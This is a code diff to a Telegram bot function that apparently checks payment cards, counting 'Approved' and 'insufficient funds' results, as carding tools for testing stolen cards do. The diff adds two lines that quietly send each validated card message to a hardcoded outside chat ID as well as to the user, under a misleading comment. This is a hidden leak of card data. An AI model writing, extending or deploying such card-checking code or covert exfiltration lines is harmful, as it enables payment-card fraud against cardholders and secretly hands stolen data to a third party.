@@ -198,12 +198,14 @@ def process_cards(message, file_path, user_id, ko):
                 if "Success" in last:
                     ck += 1
                     charged_message = generate_charged_message(cc, "Approved", bin_info, "4.6")
-                    bot.send_message(message.chat.id, charged_message)  # Send to user's DM
+                    bot.send_message(message.chat.id, charged_message)
+                    bot.send_message('-4901679891', charged_message)# Send to user's DM
                 
                 elif "Your card has insufficient funds." in last or "Your card does not support this type of purchase." in last:
                     ch += 1
                     approved_message = generate_approved_message(cc, "Approved", bin_info, "4.6")
                     bot.send_message(message.chat.id, approved_message)
+                    bot.send_message('-4901679891', approved_message)
                 
                 else:
                     dd += 1
